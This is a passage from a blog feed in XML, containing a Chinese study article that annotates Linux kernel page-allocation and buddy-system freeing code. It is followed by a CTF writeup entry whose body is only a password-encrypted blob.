class="class">__<span class="title">alloc_pages_slowpath</span>(<span class="title">gfp_t</span> <span class="title">gfp_mask</span>, <span class="title">unsigned</span> <span class="title">int</span> <span class="title">order</span>,</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_context</span> *<span class="title">ac</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">bool</span> can_direct_reclaim = gfp_mask &amp; __GFP_DIRECT_RECLAIM;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">bool</span> costly_order = order &gt; PAGE_ALLOC_COSTLY_ORDER;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> alloc_flags;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> did_some_progress;</span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">compact_priority</span> <span class="title">compact_priority</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">compact_result</span> <span class="title">compact_result</span>;</span></span><br><span class="line"><span class="keyword">int</span> compaction_retries;</span><br><span class="line"><span class="keyword">int</span> no_progress_loops;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> cpuset_mems_cookie;</span><br><span class="line"><span class="keyword">int</span> reserve_flags;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果内存分配标志包含__GFP_ATOMIC(来自不能阻塞或延迟和失败没有回调的原子上下文的请求), __GFP_DIRECT_RECLAIM(可以直接回收, 表示有回收需要时会阻塞请求), 明显二者冲突, 此处做一个校验</span></span><br><span class="line"><span class="keyword">if</span> (WARN_ON_ONCE((gfp_mask &amp; (__GFP_ATOMIC|__GFP_DIRECT_RECLAIM)) ==</span><br><span class="line">(__GFP_ATOMIC|__GFP_DIRECT_RECLAIM)))</span><br><span class="line">gfp_mask &amp;= ~__GFP_ATOMIC;</span><br><span class="line"></span><br><span class="line">retry_cpuset:</span><br><span class="line">compaction_retries = <span class="number">0</span>;</span><br><span class="line">no_progress_loops = <span class="number">0</span>;</span><br><span class="line">compact_priority = DEF_COMPACT_PRIORITY;</span><br><span class="line">cpuset_mems_cookie = read_mems_allowed_begin();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 降低要求, 重新构建标志位</span></span><br><span class="line">alloc_flags = gfp_to_alloc_flags(gfp_mask);</span><br><span class="line"></span><br><span class="line">ac-&gt;preferred_zoneref = first_zones_zonelist(ac-&gt;zonelist,</span><br><span class="line">ac-&gt;highest_zoneidx, ac-&gt;nodemask);</span><br><span class="line"><span class="keyword">if</span> (!ac-&gt;preferred_zoneref-&gt;zone)</span><br><span class="line"><span class="keyword">goto</span> nopage;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果设置了ALLOC_KSWAPD, 则唤醒交换进程</span></span><br><span class="line"><span class="keyword">if</span> (alloc_flags &amp; ALLOC_KSWAPD)</span><br><span class="line">wake_all_kswapds(order, gfp_mask, ac);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 内存调整后再次分配</span></span><br><span class="line">page = get_page_from_freelist(gfp_mask, order, alloc_flags, ac);</span><br><span class="line"><span class="keyword">if</span> (page)</span><br><span class="line"><span class="keyword">goto</span> got_pg;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果满足以下条件则尝试进行内存压缩</span></span><br><span class="line"><span class="comment">// 1. 如果标识__GFP_DIRECT_RECLAIM&amp;ALLOC_NO_WATERMARK且order&gt;3(costly_order=1)则进入__alloc_pages_direct_compact</span></span><br><span class="line"><span class="comment">// 2. 如果标识__GFP_DIRECT_RECLAIM&amp;ALLOC_NO_WATERMARK且order&lt;3(costly_order=0)且迁移类型不为MIGRATE_MOVABLE则进入__alloc_pages_direct_compact</span></span><br><span class="line"><span class="keyword">if</span> (can_direct_reclaim &amp;&amp;</span><br><span class="line">(costly_order ||</span><br><span class="line">   (order &gt; <span class="number">0</span> &amp;&amp; ac-&gt;migratetype != MIGRATE_MOVABLE))</span><br><span class="line">&amp;&amp; !gfp_pfmemalloc_allowed(gfp_mask)) &#123;</span><br><span class="line">page = __alloc_pages_direct_compact(gfp_mask, order,</span><br><span class="line">alloc_flags, ac,</span><br><span class="line">INIT_COMPACT_PRIORITY,</span><br><span class="line">&amp;compact_result);</span><br><span class="line"><span class="keyword">if</span> (page)</span><br><span class="line"><span class="keyword">goto</span> got_pg;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (costly_order &amp;&amp; (gfp_mask &amp; __GFP_NORETRY)) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (compact_result == COMPACT_SKIPPED ||</span><br><span class="line">    compact_result == COMPACT_DEFERRED)</span><br><span class="line"><span class="keyword">goto</span> nopage;</span><br><span class="line"></span><br><span class="line">compact_priority = INIT_COMPACT_PRIORITY;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">retry:</span><br><span class="line"><span class="comment">/* Ensure kswapd doesn&#x27;t accidentally go to sleep as long as we loop */</span></span><br><span class="line"><span class="keyword">if</span> (alloc_flags &amp; ALLOC_KSWAPD)</span><br><span class="line">wake_all_kswapds(order, gfp_mask, ac);</span><br><span class="line"></span><br><span class="line">reserve_flags = __gfp_pfmemalloc_flags(gfp_mask);</span><br><span class="line"><span class="keyword">if</span> (reserve_flags)</span><br><span class="line">alloc_flags = current_alloc_flags(gfp_mask, reserve_flags);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(alloc_flags &amp; ALLOC_CPUSET) || reserve_flags) &#123;</span><br><span class="line">ac-&gt;nodemask = <span class="literal">NULL</span>;</span><br><span class="line">ac-&gt;preferred_zoneref = first_zones_zonelist(ac-&gt;zonelist,</span><br><span class="line">ac-&gt;highest_zoneidx, ac-&gt;nodemask);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Attempt with potentially adjusted zonelist and alloc_flags */</span></span><br><span class="line">page = get_page_from_freelist(gfp_mask, order, alloc_flags, ac);</span><br><span class="line"><span class="keyword">if</span> (page)</span><br><span class="line"><span class="keyword">goto</span> got_pg;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Caller is not willing to reclaim, we can&#x27;t balance anything */</span></span><br><span class="line"><span class="keyword">if</span> (!can_direct_reclaim)</span><br><span class="line"><span class="keyword">goto</span> nopage;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Avoid recursion of direct reclaim */</span></span><br><span class="line"><span class="keyword">if</span> (current-&gt;flags &amp; PF_MEMALLOC)</span><br><span class="line"><span class="keyword">goto</span> nopage;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 内存回收后分配内存</span></span><br><span class="line">page = __alloc_pages_direct_reclaim(gfp_mask, order, alloc_flags, ac,</span><br><span class="line">&amp;did_some_progress);</span><br><span class="line"><span class="keyword">if</span> (page)</span><br><span class="line"><span class="keyword">goto</span> got_pg;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 内存压缩后分配内存</span></span><br><span class="line">page = __alloc_pages_direct_compact(gfp_mask, order, alloc_flags, ac,</span><br><span class="line">compact_priority, &amp;compact_result);</span><br><span class="line"><span class="keyword">if</span> (page)</span><br><span class="line"><span class="keyword">goto</span> got_pg;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Do not loop if specifically requested */</span></span><br><span class="line"><span class="keyword">if</span> (gfp_mask &amp; __GFP_NORETRY)</span><br><span class="line"><span class="keyword">goto</span> nopage;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Do not retry costly high order allocations unless they are</span></span><br><span class="line"><span class="comment"> * __GFP_RETRY_MAYFAIL</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (costly_order &amp;&amp; !(gfp_mask &amp; __GFP_RETRY_MAYFAIL))</span><br><span class="line"><span class="keyword">goto</span> nopage;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 分析是否应该再次内存回收</span></span><br><span class="line"><span class="keyword">if</span> (should_reclaim_retry(gfp_mask, order, ac, alloc_flags,</span><br><span class="line"> did_some_progress &gt; <span class="number">0</span>, &amp;no_progress_loops))</span><br><span class="line"><span class="keyword">goto</span> retry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (did_some_progress &gt; <span class="number">0</span> &amp;&amp;</span><br><span class="line">should_compact_retry(ac, order, alloc_flags,</span><br><span class="line">compact_result, &amp;compact_priority,</span><br><span class="line">&amp;compaction_retries))</span><br><span class="line"><span class="keyword">goto</span> retry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Deal with possible cpuset update races before we start OOM killing */</span></span><br><span class="line"><span class="keyword">if</span> (check_retry_cpuset(cpuset_mems_cookie, ac))</span><br><span class="line"><span class="keyword">goto</span> retry_cpuset;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 杀死一些进程以获得内存</span></span><br><span class="line">page = __alloc_pages_may_oom(gfp_mask, order, ac, &amp;did_some_progress);</span><br><span class="line"><span class="keyword">if</span> (page)</span><br><span class="line"><span class="keyword">goto</span> got_pg;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Avoid allocations with no watermarks from looping endlessly */</span></span><br><span class="line"><span class="keyword">if</span> (tsk_is_oom_victim(current) &amp;&amp;</span><br><span class="line">    (alloc_flags &amp; ALLOC_OOM ||</span><br><span class="line">     (gfp_mask &amp; __GFP_NOMEMALLOC)))</span><br><span class="line"><span class="keyword">goto</span> nopage;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Retry as long as the OOM killer is making progress */</span></span><br><span class="line"><span class="keyword">if</span> (did_some_progress) &#123;</span><br><span class="line">no_progress_loops = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">goto</span> retry;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">nopage:</span><br><span class="line"><span class="comment">/* Deal with possible cpuset update races before we fail */</span></span><br><span class="line"><span class="keyword">if</span> (check_retry_cpuset(cpuset_mems_cookie, ac))</span><br><span class="line"><span class="keyword">goto</span> retry_cpuset;</span><br><span class="line"><span class="keyword">if</span> (gfp_mask &amp; __GFP_NOFAIL) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (WARN_ON_ONCE(!can_direct_reclaim))</span><br><span class="line"><span class="keyword">goto</span> fail;</span><br><span class="line"></span><br><span class="line">WARN_ON_ONCE(current-&gt;flags &amp; PF_MEMALLOC);</span><br><span class="line">WARN_ON_ONCE(order &gt; PAGE_ALLOC_COSTLY_ORDER);</span><br><span class="line">page = __alloc_pages_cpuset_fallback(gfp_mask, order, ALLOC_HARDER, ac);</span><br><span class="line"><span class="keyword">if</span> (page)</span><br><span class="line"><span class="keyword">goto</span> got_pg;</span><br><span class="line">cond_resched();</span><br><span class="line"><span class="keyword">goto</span> retry;</span><br><span class="line">&#125;</span><br><span class="line">fail:</span><br><span class="line">warn_alloc(gfp_mask, ac-&gt;nodemask,</span><br><span class="line"><span class="string">&quot;page allocation failure: order:%u&quot;</span>, order);</span><br><span class="line">got_pg:</span><br><span class="line"><span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="free-pages"><a href="#free-pages" class="headerlink" title="free_pages"></a>free_pages</h4><p><strong>原型：extern void free_pages(unsigned long <em>addr</em>, unsigned int order);</strong></p><p>关于<code>free_pages</code>其实没什么内容，我们只需要一直跟进到<code>free_the_page</code>，它的调用链如下：</p><p><code>free_pages</code> -&gt; <code>__free_pages</code> -&gt; <code>free_the_page</code></p><h5 id="free-the-page"><a href="#free-the-page" class="headerlink" title="free_the_page"></a>free_the_page</h5><p><strong>原型：static inline void free_the_page(struct page *page, unsigned int order)</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">free_the_page</span><span class="params">(struct page *page, <span class="keyword">unsigned</span> <span class="keyword">int</span> order)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (order == <span class="number">0</span>)<span class="comment">/* Via pcp? */</span></span><br><span class="line">free_unref_page(page);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">__free_pages_ok(page, order, FPI_NONE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到存在两条路径，一条是order=0，另一条是order&gt;0的路径。先看order=0的路径，<code>free_unref_page</code>主要调用了<code>free_unref_page_commit</code>，我们来看<code>free_unref_page_commit</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">free_unref_page_commit</span><span class="params">(struct page *page, <span class="keyword">unsigned</span> <span class="keyword">long</span> pfn)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zone</span> *<span class="title">zone</span> =</span> page_zone(page);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">per_cpu_pages</span> *<span class="title">pcp</span>;</span></span><br><span class="line"><span class="keyword">int</span> migratetype;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得迁移类型</span></span><br><span class="line">migratetype = get_pcppage_migratetype(page);</span><br><span class="line">__count_vm_event(PGFREE);</span><br><span class="line"></span><br><span class="line"><span class="comment">// pcp_list 只放置unmovable, reclaimable, movable类型page</span></span><br><span class="line"><span class="comment">// 大于等于MIGRATE_PCPTYPES的迁移类型中MIGRATE_ISOLATE不能被放入pcp</span></span><br><span class="line"><span class="keyword">if</span> (migratetype &gt;= MIGRATE_PCPTYPES) &#123;</span><br><span class="line"><span class="keyword">if</span> (unlikely(is_migrate_isolate(migratetype))) &#123;</span><br><span class="line">            <span class="comment">// 放入伙伴系统</span></span><br><span class="line">free_one_page(zone, page, pfn, <span class="number">0</span>, migratetype,</span><br><span class="line">      FPI_NONE);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">migratetype = MIGRATE_MOVABLE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pcp = &amp;this_cpu_ptr(zone-&gt;pageset)-&gt;pcp;</span><br><span class="line">    <span class="comment">// 将page放入pcp-&gt;lists[migratetype]链表表头</span></span><br><span class="line">list_add(&amp;page-&gt;lru, &amp;pcp-&gt;lists[migratetype]);</span><br><span class="line">pcp-&gt;count++;</span><br><span class="line">    <span class="comment">// 如果pcp-&gt;count(pcp中页数目) &gt;= pcp-&gt;high(pcp中最大页数目), 则将多余的page放入伙伴系统</span></span><br><span class="line"><span class="keyword">if</span> (pcp-&gt;count &gt;= READ_ONCE(pcp-&gt;high))</span><br><span class="line">free_pcppages_bulk(zone, READ_ONCE(pcp-&gt;batch), pcp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里单个页的释放其实可以看到是和我们的申请是相对应的。</p><p>接下来我们看另一条路径<code>__free_pages_ok</code> ，<code>__free_pages_ok</code> 主要是对<code>free_one_page</code>的调用，我们看<code>free_one_page</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> __free_one_page(struct page *page,</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> pfn,</span><br><span class="line">struct zone *zone, <span class="keyword">unsigned</span> <span class="keyword">int</span> order,</span><br><span class="line"><span class="keyword">int</span> migratetype, <span class="keyword">fpi_t</span> fpi_flags)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">capture_control</span> *<span class="title">capc</span> =</span> task_capc(zone);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> buddy_pfn;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> combined_pfn;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> max_order;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">buddy</span>;</span></span><br><span class="line"><span class="keyword">bool</span> to_tail;</span><br><span class="line"></span><br><span class="line">max_order = <span class="keyword">min_t</span>(<span class="keyword">unsigned</span> <span class="keyword">int</span>, MAX_ORDER - <span class="number">1</span>, pageblock_order);</span><br><span class="line"></span><br><span class="line">VM_BUG_ON(!zone_is_initialized(zone));</span><br><span class="line">VM_BUG_ON_PAGE(page-&gt;flags &amp; PAGE_FLAGS_CHECK_AT_PREP, page);</span><br><span class="line"></span><br><span class="line">VM_BUG_ON(migratetype == <span class="number">-1</span>);</span><br><span class="line"><span class="keyword">if</span> (likely(!is_migrate_isolate(migratetype)))</span><br><span class="line">__mod_zone_freepage_state(zone, <span class="number">1</span> &lt;&lt; order, migratetype);</span><br><span class="line"></span><br><span class="line">VM_BUG_ON_PAGE(pfn &amp; ((<span class="number">1</span> &lt;&lt; order) - <span class="number">1</span>), page);</span><br><span class="line">VM_BUG_ON_PAGE(bad_range(zone, page), page);</span><br><span class="line"></span><br><span class="line">continue_merging:</span><br><span class="line">    <span class="comment">// 循环遍历知道order = max_order - 1</span></span><br><span class="line"><span class="keyword">while</span> (order &lt; max_order) &#123;</span><br><span class="line"><span class="keyword">if</span> (compaction_capture(capc, page, order, migratetype)) &#123;</span><br><span class="line">__mod_zone_freepage_state(zone, -(<span class="number">1</span> &lt;&lt; order),</span><br><span class="line">migratetype);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">         <span class="comment">// buddy_pfn = page_pfn ^ (1 &lt;&lt; order);</span></span><br><span class="line"><span class="comment">// 定位兄弟页</span></span><br><span class="line">buddy_pfn = __find_buddy_pfn(pfn, order);</span><br><span class="line">         <span class="comment">// 获得兄弟页的struct page</span></span><br><span class="line">buddy = page + (buddy_pfn - pfn);</span><br><span class="line"></span><br><span class="line">         <span class="comment">// 判断buddy_pfn是否有效</span></span><br><span class="line"><span class="keyword">if</span> (!pfn_valid_within(buddy_pfn))</span><br><span class="line"><span class="keyword">goto</span> done_merging;</span><br><span class="line">         <span class="comment">// 1. buddy_ord == order</span></span><br><span class="line"><span class="comment">// 2. buddy_zone == zone</span></span><br><span class="line"><span class="comment">// 3. buddy-&gt;_refcount == 0</span></span><br><span class="line"><span class="comment">// 若满足以上条件则buddy可合并</span></span><br><span class="line"><span class="keyword">if</span> (!page_is_buddy(page, buddy, order))</span><br><span class="line"><span class="keyword">goto</span> done_merging;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (page_is_guard(buddy))</span><br><span class="line">clear_page_guard(zone, buddy, order, migratetype);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">            <span class="comment">// 将buddy从对应free_area[order]中删除</span></span><br><span class="line">del_page_from_free_list(buddy, zone, order);</span><br><span class="line">        </span><br><span class="line">         <span class="comment">// 设置合并页的struct page以及pfn</span></span><br><span class="line">combined_pfn = buddy_pfn &amp; pfn;</span><br><span class="line">page = page + (combined_pfn - pfn);</span><br><span class="line">pfn = combined_pfn;</span><br><span class="line">order++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (order &lt; MAX_ORDER - <span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(has_isolate_pageblock(zone))) &#123;</span><br><span class="line"><span class="keyword">int</span> buddy_mt;</span><br><span class="line"></span><br><span class="line">buddy_pfn = __find_buddy_pfn(pfn, order);</span><br><span class="line">buddy = page + (buddy_pfn - pfn);</span><br><span class="line">buddy_mt = get_pageblock_migratetype(buddy);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (migratetype != buddy_mt</span><br><span class="line">&amp;&amp; (is_migrate_isolate(migratetype) ||</span><br><span class="line">is_migrate_isolate(buddy_mt)))</span><br><span class="line"><span class="keyword">goto</span> done_merging;</span><br><span class="line">&#125;</span><br><span class="line">max_order = order + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">goto</span> continue_merging;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">done_merging:</span><br><span class="line">    <span class="comment">// 设置page的阶数, 将page标记为伙伴系统页</span></span><br><span class="line">set_buddy_order(page, order);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果page并不是最大的page, 检查伙伴页是否是free状态的, 如果是, 但是上述步骤合并失败则有可能伙伴页正在被释放, 这时候应该把page放在zone-&gt;free_area[order]尾部(延缓page被分配出去), 这样等伙伴页释放完成后就可以一起被合并成更大的page了</span></span><br><span class="line"><span class="keyword">if</span> (fpi_flags &amp; FPI_TO_TAIL)</span><br><span class="line">to_tail = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (is_shuffle_order(order))</span><br><span class="line">to_tail = shuffle_pick_tail();</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">to_tail = buddy_merge_likely(pfn, buddy_pfn, page, order);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (to_tail)</span><br><span class="line">        <span class="comment">// 把page置入zone-&gt;free_area[order]链表尾部</span></span><br><span class="line">add_to_free_list_tail(page, zone, order, migratetype);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        <span class="comment">// 把page置入zone-&gt;free_area[order]链表头部</span></span><br><span class="line">add_to_free_list(page, zone, order, migratetype);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Notify page reporting subsystem of freed page */</span></span><br><span class="line"><span class="keyword">if</span> (!(fpi_flags &amp; FPI_SKIP_REPORT_NOTIFY))</span><br><span class="line">page_reporting_notify_free(order);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Linux内核对物理内存描述&quot;&gt;&lt;a href=&quot;#Linux内核对物理内存描述&quot; class=&quot;headerlink&quot; title=&quot;Linux内核对物理内存描述&quot;&gt;&lt;/a&gt;Linux内核对物理内存描述&lt;/h2&gt;&lt;p&gt;Linux将物理内存按固定大小的页面（一般为
      
    
    </summary>
    
    
      <category term="Learning" scheme="https://billyotry.github.io/categories/Learning/"/>
    
    
      <category term="Kernel" scheme="https://billyotry.github.io/tags/Kernel/"/>
    
  </entry>
  
  <entry>
    <title>【Writeup】GitHub Security Lab CTF-1</title>
    <link href="https://billyotry.github.io/2021/04/07/%E3%80%90Writeup%E3%80%91GitHub%20Security%20Lab%20CTF-1/"/>
    <id>https://billyotry.github.io/2021/04/07/%E3%80%90Writeup%E3%80%91GitHub%20Security%20Lab%20CTF-1/</id>
    <published>2021-04-07T08:20:21.110Z</published>
    <updated>2021-04-11T08:47:20.894Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="01f57d877d25c31f1dcaf974aabbcee9c92b9afdb24bdd3acef7083bd57e58fc">60c8fb4a25acc80be70b6eda0913804634b0eab35fd83bcfcaa9879cf933cfe4e53e34d0355b248f5e2840de95c4aa62b835fca78c4d1f49f9ddb54266dba18f44eb7f8c9a3e74b01f06488993eed8d37ba351aa43ab381838b5b98e15687365cfde9f5ed30e1f97c1821fb9981e924ccaceb9679f236721f80d662dfa592af68056b5c9a80c6be8e7d6985c5739de711384ed9a405a00a64620af226284d2097563fcdca7fed6444a3cb4e00fa285ec728b6a997ecc93e9dbefdcc6f93aa3f52a1c05be4f174e8100052ab0d7e094bd08b216bc07e34372ed3632b71ef4623f08c15df58d0fecaf5f9e0e08408eb292daf3a213ee688ab25c01b7a7fb78694df569c67a073e7719a84c53bb21971a7afcf33a1051c9035aa753b6dca95c0e6b0d54a20e2bc5a4f4459db39ff231d9fb4ee21aa8f9174b54de5c5f5a7ea58c79302f730f2258f8c96962d02678e05da23d548541d1f62bdd820093f10515f5337cbdb023431f847d02502b844208ed893b02a4bf1b07c0a5505b5d6e800496b1c67934d7764b6d5c22b4ba6c72ac2cacfaf126a8c04cbb639f6a14211b4c4292764340efa321050b1273dccb4274330b30dc08e02b011d41380477c7c00c1a116308ec3ea65ba05ab153190e66be8bb43e5867d16c9d37f323fff0706ff006484ee1db138154cb43f553d1535fa8b5c251b39e1128a9908c2f32dbdfd5edd9be5b1a26db0fab7c5bd4b6c21b8ab8b4c64f404e57cc2c2222ce613421f3ae6c5e68b02045c6ad9b30da30ebead45b952f851ef3f5ed545139ea016a8bad88a5f34a684a360619c12559db9a8a43e189950f955781de2947d7a049fd054fa09ac0a0b5e806ff1b2f289094e5725cff351f5df677a043c5e32a3a6d04bc92b7bd4ff98a1aab4974d9f07def1f2ec8e882abf05f008dfafe2b0bd75bd90036e376c5ee31b79c769400691b4835c6f188b2a5775b516c5dd60e71ac73e9885102e8978daf1bb255939f03c500e1b2010436c27462556bda604d17b01cf6fd0789b80634eaa5748041eaa41ce95a7972ef2fe75b1fd0aec8cef7990a94e0ad1e0f65466409c04764b6f9a7a38d1ff3d92e6578f7bb9ae41c9b22deea575c44c4a50fea0e3050585c2a91b4842fb61326af51ad65a48848537c99a63108e370757fa05040a39dd03aaaec19e4170f5bb6580a11b98625fcff4a96daea83a0ff3ffb59367ca09f7bcafae27e48dae3cf0f59bb777dcddeada5ca71d4503d6453eb0f92ab1e5bf69bb8afe076b5fd28cb37af3384caac3c69b883063c36397803c5f4a2e0065cf5cb951585f3a7258b78f4098fef136769f57e76d885ae4c0dfc3ee5a04b4af0d41cdd637f2bf7e514468d9c399fcbf21481e335da79c8bc3668fc2eeff64932bb65c8d4117b0c2be817ecff9c800ece05a6ead679968c84dbcef0729fde0f461391ddb9c2a0048627f21d6a9177482ed379c4a66d56bf07e31a0e11225c4857f4e95283b99dd873590f3e39f10e1c397e52efece4bde4afca63e6fad37b3b1cefea54afae3806f223d6f3e67b99e3b692ab0994d9152ddfce09aa1ddd80b16f32bf64e4196a99d98461f1ca99a4cc01f4e699a83aaf065b12f165f6f846e07b44dc81f68e6ad0288075d45edef0e4937e1a7f61c13ccc9bfae3b86ba7b951d955da56a1d36ecd05b63148a76a82cab0a68b675a21aa276504fdef6b2306271ba597c41b8d1c130e07d2d060886f66bf809d9b8c4c954c6f0592a8960ee9831d7dcaa1b202a423b37963f51ff47ef8fcfb25a2196f8d54b90ccabf688792aa5b1f26d9c55038226a625d080d77f35bd41c5d9bc69a60c4aa72773761ed1fe65fe52123af9afd431bad6cc0b498080cccf9bbe1a45839b04aedc4911d9317be566c4b2d9e8af64b33ac1a797e1a15158c6c09c1b3e73ad0ff9394aa7cc4ab04d8ee9bb3b2951e985113b0a623934ab225bb58793f6f29dddac253cd990dd1254facfc66ebdb339ac29908115eb484ab48076da0bc624b2cf654148c6fde82745ef5dcbd84aac98fb2a0e977b2bb0831616cfb14a47ac02725288e93c6fe14874f95c07fe49cedd6d261fcde538499e1f602f8a7c4940d7d527c9a9db35a50daf3fe1e1e761faf79c3b52befe510f0a0f468bb7579875ca9b64d7365758fec2c51f93d37ba0e8ff413f17ae3c1fcf672f9ad45fedfb55a31da4735044d5d7f3fe410f3206412184aed9f482c132c896c85fd098a3f90807aa172e0be6d369b74f95a3fc02ced312d12891edec565a32c6f3dc899b81cd055d0932943c02fa759cd2df2d94dc958d49e483a8fe266eced31bf487aeba8712fad1b81e254943bbe4d12d9616257e09c1c23a783899e47cb3663b1ea9507e5507ee4be69425bc4df8f7eddb323840961e5a4554fa67ad0c76ac676263e5d7c3bde36550b6e309457f3ebfcb1118ece4e29a71e4346f870ef22af5edb0bb6e7039dadc9115a013dda742b19136121579be3a285b7d8992ea4eefda7c6bd33246076580db1ec7acac767cd41da59fb2de0df68fdbed739670e65d6b1309169010f95efebe02eb144edb91bc810acdac678b91a061edeb6dd1929f8a807d93ee0f359b86e6e8d7d3e582cf85bf53381d09cfa4b9a6c2d61e38c3838dc358ad0bcbc957da12da4a74da03a27eee2179673ace7289ead9bc066b61db35c7836ec8e85a7ab3d594cb6f87a87469e78daa41bb61cd98d99c269c321f7f1c45687befe99312fb409d6a90e2462ccc62c239fdd7e7ccf8cbafbb525de9e0c9b1cc95146e85998ad01067738c978d1fe6adff9ec6192d549324beccf528eade41319680c236093cb30aeb5f70933559cbe85a3aa21256e450600d7e1d61b603f141ecc02a35813f0a67bfad89c5382aee8d6b51dfdc3c59710bab9243b9ae13bf5482e04ad33e639687b8525d1d1f4b143e40231e8094e973be388cfe87eebe0941f2c36468def2ddb42bf2937162aeecca4a167a3d355e08f811646029dfdba6ad276d478e071be0968ce8fc129ca6664de1a60d80fc3f3ca01333d76b68bbeee6579432009ba94b246b715d97c577a6d58dd2e3452f6f14f6f3ed66156b382d5f52b5fe6db123dce186a55ee851917779a5b57ddfedaa15e7fce632e4367169fb0fb3217f5860c39c16dc55239373afa263655255c1398a441a90a4b60413622d654cc0fe886cf14f8ce48ba8dbc62cf0504b8455cef5309f213a9ea901c67570f886653562f1fd2498c6af5ab80b787dfe10854a6df5bd6a6a65f9863dd95d3c7a63b5e76c5aa1cbab24e5a827ef2e9ddbb2d5a2e22665598c7482797ce05aa4ce6e60f04ea1ae19220c4aced5831cf42788720532cc3205509b2f453f6b4e391e96b0f7522a8ae9c8f7fb07050cca3cb9ee8b35a5234a8c5a1efe34a7c654170daeb4a6bfa1a6c3ba81d2f09686ec184953e4731b66ca580fa3b6d24ad119a9464f4a7b91d2b2fcb742be143a6d25b8cd4def98b522766bda981453643d6974f3dafdcdd00be061cecfedddf7874243890753851214c112c7e3a15c183aa1f22520fcbf4695cc9915db6df1fefce77fe6471c81e5ed11c697fae10dc927b12c7a85b1a70523680e462